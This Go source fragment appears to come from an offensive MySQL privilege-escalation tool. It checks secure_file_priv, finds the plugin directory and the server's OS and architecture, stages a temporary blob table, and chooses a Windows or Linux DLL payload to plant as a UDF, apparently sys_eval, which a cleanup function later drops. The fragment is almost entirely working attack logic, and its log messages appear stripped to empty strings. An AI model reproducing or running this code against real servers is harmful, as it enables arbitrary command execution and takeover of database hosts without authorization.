func DataMethod(conn *sql.DB) (databasename string) {
	Info("")
	databasename = RandStr(3)
	_, err1 := MysqlCMD(fmt.Sprintf("create database %s;", databasename), conn)
	if err1 != nil {
		Err(err1)
		Info("")
		//os.Exit(1)
	}

	Info("temp")
	_, err2 := MysqlCMD(fmt.Sprintf("create table %s.temp(data longblob);", databasename), conn)
	if err2 != nil {
		Err(err2)
		Info("temp")
		os.Exit(1)
	}
	Info("")
	_, err3 := MysqlCMD(fmt.Sprintf("insert into %s.temp values(\"\");", databasename), conn)
	if err3 != nil {
		Err(err3)
		Info("")
		os.Exit(1)
	}
	return databasename
}

// 
func UdfUdfPrivilegeDetail(conn *sql.DB, ostype string, plugin_path string) {
	udfname := RandStr(3)
	databasename := DataMethod(conn)

	if ostype == "Win32" {
		Detail(conn, plugin_path, Win32dll, udfname, databasename)
	} else if ostype == "Win64" {
		Detail(conn, plugin_path, Win64dll, udfname, databasename)
	} else if ostype == "Linux64" {
		Detail(conn, plugin_path, Linux64dll, udfname, databasename)
	} else if ostype == "Linux32" {
		Detail(conn, plugin_path, Linux32dll, udfname, databasename)
	} else {
		Info("")
	}
}

// 
func ChoiceDetail(conn *sql.DB, compile_version_string string, plugin_path string, versioncompilemachine_value string) {
	if strings.HasPrefix(compile_version_string, "Win") {
		parts := strings.Split(compile_version_string, "in")
		if fmt.Sprintf("%s", parts[1]) == "32" {
			UdfUdfPrivilegeDetail(conn, "Win32", plugin_path)
		} else if fmt.Sprintf("%s", parts[1]) == "64" {
			UdfUdfPrivilegeDetail(conn, "Win64", plugin_path)
		} else {
			Info("3264")
		}
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(compile_version_string), "64") {
		UdfUdfPrivilegeDetail(conn, "Linux64", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(compile_version_string), "32") {
		UdfUdfPrivilegeDetail(conn, "Linux32", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") && strings.Contains(strings.ToLower(versioncompilemachine_value), "64") {
		UdfUdfPrivilegeDetail(conn, "Linux64", plugin_path)
	} else if strings.Contains(strings.ToLower(compile_version_string), "linux") {
		UdfUdfPrivilegeDetail(conn, "Linux32", plugin_path)
	} else {
		Info("3264")
	}

}

// secure_file_priv
func UdfPrivilege(conn *sql.DB) {
	// secure_file_priv
	secure_file_priv, result := get_secure_file_priv(conn)
	if result == true {
		Info("secure_file_priv")
		if secure_file_priv == "NULL" {
			Info("secure_file_privNULL")
		} else if secure_file_priv == "/" {
			Info("secure_file_priv/ / ")
		} else if len(fmt.Sprintf("%s", secure_file_priv)) == 0 {
			Info("secure_file_priv")
			// Plugin
			plugin_path := get_plugin(conn)

			// 
			compile_version_string, versioncompilemachine_value := get_compile(conn)

			// 
			ChoiceDetail(conn, compile_version_string, plugin_path, versioncompilemachine_value)

		} else {
			Info("secure_file_privNULL\\,")
		}
	} else {
		Info("secure_file_priv,")

		// 
		compile_version_string, versioncompilemachine_value := get_compile(conn)

		// Plugin
		plugin_path := get_plugin(conn)

		// 
		ChoiceDetail(conn, compile_version_string, plugin_path, versioncompilemachine_value)
	}
}

func DropSYSEVAL(conn *sql.DB) {
	Info("sys_eval")
	_, err := MysqlCMD("drop FUNCTION sys_eval;", conn)
	if err != nil {
		Err(err)
	}
}
